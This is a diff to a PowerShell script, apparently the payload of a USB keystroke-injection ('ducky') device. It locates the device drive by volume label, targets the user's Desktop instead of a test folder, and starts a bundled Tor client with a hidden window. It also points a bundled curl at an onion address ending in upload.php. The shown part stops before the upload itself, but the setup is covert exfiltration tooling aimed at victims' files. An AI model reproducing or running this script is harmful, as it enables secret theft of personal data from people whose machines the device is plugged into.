@@ -1,10 +1,17 @@
+# Define the volume label you're looking for
+$targetLabel = "CIRCUITPY"  # Replace this with your actual volume label
+
+# Get all logical drives and filter by volume label
+$drive = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }
+
+# Set drive letter for drive path
+$drivePath = "$($drive.DriveLetter):\"
+
 # Set paths
-$drive = [Environment]::GetFolderPath("UserProfile") + "\Desktop\ducky"
+$targetDirectory = [Environment]::GetFolderPath("UserProfile") + "\Desktop"
 $torPath = "$drive\tor\tor.exe"
 $torrcPath = "$drive\tor\torrc"
 $curlPath = "$drive\curl\curl.exe"
-# $userPath = [Environment]::GetFolderPath("UserProfile")
-$userPath = "$drive\test"
 $onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion/upload.php"
 $logFile = "$drive\tor.log"
 Set-Content -Path $torrcPath -Value @"
@@ -14,7 +21,7 @@ Log notice file $logFile
 "@
 
 # Start Tor
-$torProcess = Start-Process -FilePath $torPath -ArgumentList "-f `"$torrcPath`"" -RedirectStandardOutput "$drive\tor.log" -WindowStyle Hidden -PassThru
+$torProcess = Start-Process -FilePath $torPath -ArgumentList "-f `"$torrcPath`"" -RedirectStandardOutput "$logFile" -WindowStyle Hidden -PassThru
 
 # Wait for Tor to bootstrap
 $bootstrapped = $false
